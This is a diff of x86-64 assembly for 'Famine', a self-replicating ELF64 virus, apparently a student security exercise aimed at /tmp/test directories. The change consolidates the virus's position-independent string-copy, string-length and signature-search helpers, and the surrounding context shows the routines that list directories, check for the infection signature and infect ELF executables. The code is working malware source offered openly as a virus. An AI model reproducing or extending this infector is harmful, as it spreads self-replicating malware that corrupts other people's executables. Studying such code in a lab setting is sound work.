@@ -15,6 +15,120 @@ encrypted_offset:
 encrypted_size:
     dq 0                        
 
+; ============================================
+; SHARED POSITION-INDEPENDENT UTILITY FUNCTIONS
+; These functions work in both original Famine and virus contexts
+; ============================================
+
+; ============================================
+; str_len(char *str) -> rax = length
+; rdi = pointer to null-terminated string
+; ============================================
+str_len:
+    push rdi
+    xor rax, rax
+.loop:
+    cmp byte [rdi], 0
+    je .done
+    inc rdi
+    inc rax
+    jmp .loop
+.done:
+    pop rdi
+    ret
+
+; ============================================
+; str_copy(char *dest, char *src)
+; rdi = destination
+; rsi = source
+; Copies src to dest including null terminator
+; Returns original destination pointer
+; ============================================
+str_copy:
+    push rdi
+.loop:
+    lodsb                       ; load byte from [rsi] into al, inc rsi
+    stosb                       ; store al to [rdi], inc rdi
+    test al, al
+    jnz .loop
+    pop rax                     ; return original dest in rax
+    ret
+
+; ============================================
+; search_substring(char *haystack, size_t haystack_len, char *needle, size_t needle_len)
+; rdi = haystack (buffer to search in)
+; rsi = haystack_len (length of buffer)
+; rdx = needle (string to search for)
+; rcx = needle_len (length of needle)
+; Returns: rax = 1 if found, 0 if not found
+; ============================================
+search_substring:
+    push rbp
+    mov rbp, rsp
+    push r12                    ; haystack
+    push r13                    ; haystack_len
+    push r14                    ; needle
+    push r15                    ; needle_len
+    push rbx                    ; current position
+
+    mov r12, rdi                ; r12 = haystack
+    mov r13, rsi                ; r13 = haystack_len
+    mov r14, rdx                ; r14 = needle
+    mov r15, rcx                ; r15 = needle_len
+
+    ; If needle is longer than haystack, not found
+    cmp r15, r13
+    ja .search_not_found
+
+    xor rbx, rbx                ; rbx = current position in haystack
+
+.search_loop:
+    ; Check if we have enough bytes left
+    mov rax, r13
+    sub rax, rbx                ; bytes remaining
+    cmp rax, r15
+    jb .search_not_found        ; not enough bytes left
+
+    ; Compare needle with current position in haystack
+    lea rdi, [r12 + rbx]        ; current position in haystack
+    mov rsi, r14                ; needle
+    mov rcx, r15                ; needle_len
+    
+    ; Byte-by-byte comparison
+    xor rax, rax                ; match counter
+.compare_loop:
+    cmp rax, r15
+    jge .search_found           ; all bytes matched
+
+    mov r8b, [rdi + rax]        ; byte from haystack
+    mov r9b, [rsi + rax]        ; byte from needle
+    cmp r8b, r9b
+    jne .search_next            ; mismatch, try next position
+
+    inc rax
+    jmp .compare_loop
+
+.search_next:
+    inc rbx                     ; move to next position
+    jmp .search_loop
+
+.search_found:
+    mov rax, 1
+    jmp .search_done
+
+.search_not_found:
+    xor rax, rax
+
+.search_done:
+    pop rbx
+    pop r15
+    pop r14
+    pop r13
+    pop r12
+    mov rsp, rbp
+    pop rbp
+    ret
+
 _start:
     ; Save all registers we'll use
     push rbp
@@ -255,7 +369,7 @@ _start.run_as_virus:
     ; Build path on stack: "/tmp/test"
     lea rdi, [rsp + 8]          ; path buffer
     lea rsi, [r15 + v_firstDir - virus_start]  ; virus embedded string
-    call virus_str_copy
+    call str_copy
     
     ; List files in directory
     lea rdi, [rsp + 8]          ; path buffer
@@ -267,7 +381,7 @@ _start.run_as_virus:
     ; Also process /tmp/test2 directory
     lea rdi, [rsp + 8]          ; path buffer
     lea rsi, [r15 + v_secondDir - virus_start]  ; virus embedded string
-    call virus_str_copy
+    call str_copy
     
     ; List files in directory
     lea rdi, [rsp + 8]          ; path buffer
@@ -316,115 +430,6 @@ v_signature:      db "Famine version 1.0 (c)oded by <ocrossi>-<elaignel>", 0
 v_signature_len:  equ $ - v_signature - 1
 
 ; ============================================
-; virus_str_copy - Copy string avec adresses relatives
-; rdi = destination
-; rsi = source
-; ============================================
-virus_str_copy:
-    push rax
-.v_str_copy_loop:
-    lodsb
-    stosb
-    test al, al
-    jnz .v_str_copy_loop
-    pop rax
-    ret
-
-; ============================================
-; virus_str_len - Get string length avec adresses relatives
-; rdi = string pointer
-; Returns: rax = length
-; ============================================
-virus_str_len:
-    push rdi
-    xor rax, rax
-.v_str_len_loop:
-    cmp byte [rdi], 0
-    je .v_str_len_done
-    inc rdi
-    inc rax
-    jmp .v_str_len_loop
-.v_str_len_done:
-    pop rdi
-    ret
-
-; ============================================
-; virus_search_signature - Search for signature in buffer
-; rdi = haystack (buffer to search in)
-; rsi = haystack_len (length of buffer)
-; rdx = needle (string to search for)
-; rcx = needle_len (length of needle)
-; Returns: rax = 1 if found, 0 if not found
-; Position-independent version for virus payload
-; ============================================
-virus_search_signature:
-    push rbp
-    mov rbp, rsp
-    push r12                    ; haystack
-    push r13                    ; haystack_len
-    push r14                    ; needle
-    push rbx                    ; current position
-
-    mov r12, rdi                ; r12 = haystack
-    mov r13, rsi                ; r13 = haystack_len
-    mov r14, rdx                ; r14 = needle
-    ; rcx already has needle_len
-
-    ; If needle is longer than haystack, not found
-    cmp rcx, r13
-    ja .vss_not_found
-
-    xor rbx, rbx                ; rbx = current position in haystack
-
-.vss_loop:
-    ; Check if we have enough bytes left
-    mov rax, r13
-    sub rax, rbx                ; bytes remaining
-    cmp rax, rcx
-    jb .vss_not_found           ; not enough bytes left
-
-    ; Compare needle with current position in haystack
-    push rcx                    ; save needle_len
-    lea rdi, [r12 + rbx]        ; current position in haystack
-    mov rsi, r14                ; needle
-    
-    ; Byte-by-byte comparison
-    xor rax, rax                ; match counter
-.vss_compare_loop:
-    cmp rax, rcx
-    jge .vss_found              ; all bytes matched
-
-    mov r8b, [rdi + rax]        ; byte from haystack
-    mov r9b, [rsi + rax]        ; byte from needle
-    cmp r8b, r9b
-    jne .vss_next               ; mismatch, try next position
-
-    inc rax
-    jmp .vss_compare_loop
-
-.vss_next:
-    pop rcx                     ; restore needle_len
-    inc rbx                     ; try next position
-    jmp .vss_loop
-
-.vss_found:
-    pop rcx                     ; restore needle_len
-    mov rax, 1                  ; found
-    jmp .vss_done
-
-.vss_not_found:
-    xor rax, rax                ; not found
-
-.vss_done:
-    pop rbx
-    pop r14
-    pop r13
-    pop r12
-    mov rsp, rbp
-    pop rbp
-    ret
-
-; ============================================
 ; virus_list_and_infect - List files and infect ELF64 executables
 ; rdi = path buffer
 ; rsi = file count pointer
@@ -446,7 +451,7 @@ virus_list_and_infect:
 
     ; Get path length
     mov rdi, r12
-    call virus_str_len
+    call str_len
     mov [rbp-8], rax            ; save path length
 
     ; Open directory
@@ -521,7 +526,7 @@ virus_list_and_infect:
 .vl_no_slash:
     ; rsi already points to d_name
     push rdi
-    call virus_str_copy
+    call str_copy
     pop rdi
 
     ; Restore d_type
@@ -687,7 +692,7 @@ virus_infect_elf:
     mov rsi, rax                ; bytes_read
     lea rdx, [r15 + v_signature - virus_start]  ; signature
     mov rcx, v_signature_len    ; signature length
-    call virus_search_signature
+    call search_substring
     
     pop rcx                     ; restore bytes_read into rcx
     
@@ -983,7 +988,7 @@ virus_infect_elf:
     mov rsi, rax                ; bytes_read
     lea rdx, [r15 + v_signature - virus_start]  ; signature
     mov rcx, v_signature_len    ; signature length
-    call virus_search_signature
+    call search_substring
     
     pop rcx                     ; restore bytes_read into rcx
     
